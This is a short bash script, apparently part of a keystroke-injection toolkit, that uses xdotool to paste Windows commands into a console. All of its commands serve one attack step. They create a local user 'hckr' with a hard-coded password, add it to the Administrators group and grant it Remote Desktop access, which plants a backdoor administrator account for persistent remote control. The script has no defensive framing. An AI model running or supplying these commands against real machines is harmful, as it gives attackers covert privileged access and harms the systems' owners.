#!/bin/bash

"""
Net: Add user hckr, add to administrators and RDP groups.
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "net user hckr Pwnage123 /add"
xdotool key Return

paste_command "net localgroup administrators hckr /add"
xdotool key Return

paste_command "net localgroup \"Remote Desktop Users\" hckr /add"
xdotool key Return
